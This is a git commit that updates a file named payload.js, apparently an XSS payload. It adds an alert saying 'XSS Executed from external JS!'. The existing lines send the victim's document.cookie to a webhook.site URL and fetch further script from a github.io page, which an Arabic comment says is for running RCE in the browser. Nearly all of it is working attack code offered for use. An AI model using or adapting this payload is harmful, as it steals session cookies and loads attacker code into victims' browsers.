66534d4d5fffbaf759da0b1d76890871c34c9362
saif7829 <saifwalied21@gmail.com>
2025-07-24 17:10:14 +0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,4 +1,5 @@
 fetch("https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?cookie=" + document.cookie);
+alert("XSS Executed from external JS!");
 
 // تحميل كود خارجي لتنفيذ RCE داخل المتصفح
 fetch("https://saif7829.github.io/rce/rce.js")
